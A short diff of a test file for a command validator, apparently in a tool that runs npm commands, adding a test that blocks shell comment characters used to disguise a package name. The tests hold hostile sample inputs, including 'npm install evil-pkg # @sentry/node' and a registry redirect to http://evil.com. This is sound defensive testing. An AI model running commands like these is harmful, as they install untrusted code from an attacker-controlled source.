@@ -97,6 +97,15 @@ describe("validateCommand", () => {
     }
   });
 
+  test("blocks shell comment character to prevent command truncation", () => {
+    for (const cmd of [
+      "npm install evil-pkg # @sentry/node",
+      "npm install evil-pkg#benign",
+    ]) {
+      expect(validateCommand(cmd)).toContain("Blocked command");
+    }
+  });
+
   test("blocks environment variable injection in first token", () => {
     for (const cmd of [
       "npm_config_registry=http://evil.com npm install @sentry/node",
